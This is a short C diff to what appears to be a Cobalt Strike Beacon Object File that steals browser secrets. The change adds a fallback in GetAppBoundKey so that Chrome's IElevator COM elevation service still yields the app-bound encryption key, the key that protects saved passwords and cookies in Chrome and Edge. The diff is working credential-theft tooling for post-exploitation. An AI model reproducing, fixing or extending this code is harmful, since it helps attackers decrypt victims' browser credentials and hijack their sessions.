@@ -300,6 +300,10 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     // Create an instance of the IElevator COM object
     if (MSVCRT$strcmp(browser, "chrome") == 0){
         hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&chromeElevator);
+        if (FAILED(hr)){
+            BeaconPrintf(CALLBACK_ERROR, "[*] CoCreateInstance with Chrome_IID_IElevator2 failed (0x%08X), trying Chrome_IID_IElevator...\n", hr);
+            hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &Chrome_IID_IElevator, (void**)&chromeElevator);
+        }
     }
     if (MSVCRT$strcmp(browser, "msedge") == 0){
         hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&edgeElevator);
@@ -437,7 +441,7 @@ VOID GetEncryptionKey(char * browser) {
     }
     //BeaconPrintf(CALLBACK_OUTPUT, "Got Encrypted Key ");
     if (MSVCRT$strcmp(browser, "chrome") == 0){
-        GetAppBoundKey(app_key, browser, Chrome_CLSID_Elevator, Chrome_IID_IElevator);
+        GetAppBoundKey(app_key, browser, Chrome_CLSID_Elevator, Chrome_IID_IElevator2);
     }
     if (MSVCRT$strcmp(browser, "msedge") == 0){
         GetAppBoundKey(app_key, browser, Edge_CLSID_Elevator, Edge_IID_IElevator);
